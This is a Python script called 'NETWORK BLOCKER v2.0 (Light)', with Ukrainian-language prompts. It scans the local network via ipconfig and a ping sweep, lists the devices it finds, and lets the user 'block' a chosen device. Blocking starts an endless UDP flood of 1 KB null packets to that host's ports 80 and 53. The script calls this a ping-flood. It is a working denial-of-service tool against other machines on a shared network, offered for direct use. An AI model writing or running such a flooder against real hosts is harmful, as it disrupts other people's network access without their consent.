import socket
import struct
import threading
import time
import os
import sys
import ctypes
import subprocess

PACKET_COUNT = 5000

def get_default_gateway():
    try:
        output = subprocess.check_output('ipconfig', shell=True, encoding='cp866', errors='ignore')
        for line in output.split('\n'):
            if 'Основной шлюз' in line or 'Default Gateway' in line:
                parts = line.split(':')
                if len(parts) > 1:
                    gw = parts[-1].strip()
                    if gw and '.' in gw and gw != '0.0.0.0':
                        return gw
    except:
        pass
    return '192.168.1.1'

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def get_subnet_mask():
    try:
        output = subprocess.check_output('ipconfig', shell=True, encoding='cp866', errors='ignore')
        lines = output.split('\n')
        local_ip = get_local_ip()
        for i, line in enumerate(lines):
            if local_ip in line:
                for j in range(i, min(i + 10, len(lines))):
                    if 'Маска подсети' in lines[j] or 'Subnet Mask' in lines[j]:
                        parts = lines[j].split(':')
                        if len(parts) > 1:
                            return parts[-1].strip()
    except:
        pass
    return '255.255.255.0'

def subnet_to_cidr(mask_str):
    parts = mask_str.split('.')
    binary = ''.join(bin(int(p))[2:].zfill(8) for p in parts)
    return binary.count('1')

def ip_to_int(ip):
    return struct.unpack('!I', socket.inet_aton(ip))[0]

def int_to_ip(n):
    return socket.inet_ntoa(struct.pack('!I', n))

def get_network_range(ip, cidr):
    ip_int = ip_to_int(ip)
    mask = (0xFFFFFFFF << (32 - cidr)) & 0xFFFFFFFF
    network = ip_int & mask
    broadcast = network | (~mask & 0xFFFFFFFF)
    return network, broadcast

def ping_host(ip):
    try:
        ret = subprocess.run(['ping', '-n', '1', '-w', '200', ip],
                             capture_output=True, timeout=0.5)
        return ret.returncode == 0
    except:
        return False

def scan_network_ping(network, broadcast):
    results = []
    total = broadcast - network - 1
    count = 0
    print(f"  [*] Сканую {total} адрес через ping...")
    for i in range(network + 1, min(network + 256, broadcast)):
        ip = int_to_ip(i)
        count += 1
        if count % 50 == 0:
            print(f"  [*] Прогресс: {count}/{min(255, total)}")
        if ping_host(ip):
            results.append({'ip': ip, 'mac': '??:??:??:??:??:??'})
        time.sleep(0.01)
    return results

def main():
    print("=" * 60)
    print("  NETWORK BLOCKER v2.0 (Light)")
    print("=" * 60)

    # Отримання мережевих параметрів
    gateway = get_default_gateway()
    local_ip = get_local_ip()
    mask = get_subnet_mask()
    cidr = subnet_to_cidr(mask)
    network, broadcast = get_network_range(local_ip, cidr)

    print(f"\n  Ваш IP:     {local_ip}")
    print(f"  Маска:      {mask} (/{cidr})")
    print(f"  Шлюз:       {gateway}")
    print(f"  Мережа:     {int_to_ip(network)}/{cidr}")

    # Сканування
    print(f"\n  [*] Починаю сканування мережi...")
    devices = scan_network_ping(network, broadcast)

    # Додаємо шлюз
    devices.insert(0, {'ip': gateway, 'mac': '??:??:??:??:??:??'})

    print(f"\n  [OK] Знайдено {len(devices)} пристроїв:\n")
    for idx, dev in enumerate(devices):
        dtype = "ШЛЮЗ" if dev['ip'] == gateway else "ХОСТ"
        print(f"  {idx}. {dev['ip']:<16} {dev['mac']:<20} {dtype}")

    # Меню блокування
    blocked = []

    while True:
        print(f"\n{'='*60}")
        print(f"  1. Заблокувати IP")
        print(f"  2. Розблокувати IP")
        print(f"  3. Список заблокованих")
        print(f"  4. Сканувати повторно")
        print(f"  0. Вихiд")
        print(f"{'='*60}")

        choice = input("  Вибiр: ").strip()

        if choice == '0':
            print("  [*] Вихiд...")
            break

        elif choice == '1':
            if not devices:
                print("  [!] Немає пристроїв")
                continue
            try:
                idx = int(input("  Номер пристрою: "))
                if 0 <= idx < len(devices):
                    ip = devices[idx]['ip']
                    if ip == gateway:
                        print("  [!] НЕ МОЖНА БЛОКУВАТИ ШЛЮЗ!")
                        continue
                    if ip == local_ip:
                        print("  [!] НЕ МОЖНА БЛОКУВАТИ СЕБЕ!")
                        continue
                    if ip in blocked:
                        print(f"  [!] {ip} вже заблоковано")
                        continue
                    blocked.append(ip)
                    print(f"  [OK] {ip} ДОДАНО В СПИСОК БЛОКУВАННЯ")
                    print(f"  [*] Запускаю ping-флуд на {ip}...")
                    # Запуск флуду в окремому потоцi
                    def flood(target):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        payload = b'\x00' * 1024
                        count = 0
                        while target in blocked:
                            try:
                                sock.sendto(payload, (target, 80))
                                sock.sendto(payload, (target, 53))
                                count += 2
                                if count % 1000 == 0:
                                    time.sleep(0.001)
                            except:
                                break
                        sock.close()
                    t = threading.Thread(target=flood, args=(ip,), daemon=True)
                    t.start()
                else:
                    print("  [!] Невiрний номер")
            except ValueError:
                print("  [!] Введiть число!")

        elif choice == '2':
            if not blocked:
                print("  [i] Немає заблокованих")
                continue
            print("  Заблокованi:")
            for ip in blocked:
                print(f"  - {ip}")
            ip = input("  IP для розблокування: ").strip()
            if ip in blocked:
                blocked.remove(ip)
                print(f"  [OK] {ip} розблоковано")
            else:
                print(f"  [!] {ip} не в списку")

        elif choice == '3':
            if not blocked:
                print("  [i] Немає заблокованих")
            else:
                print("  Заблокованi:")
                for ip in blocked:
                    print(f"  - {ip}")

        elif choice == '4':
            print("  [*] Повторне сканування...")
            devices = scan_network_ping(network, broadcast)
            devices.insert(0, {'ip': gateway, 'mac': '??:??:??:??:??:??'})
            print(f"  [OK] Знайдено {len(devices)} пристроїв")
            for idx, dev in enumerate(devices):
                dtype = "ШЛЮЗ" if dev['ip'] == gateway else "ХОСТ"
                status = " [ЗАБЛОК]" if dev['ip'] in blocked else ""
                print(f"  {idx}. {dev['ip']:<16} {dtype}{status}")

        else:
            print("  [!] Невiрний вибiр")

if __name__ == '__main__':
    main()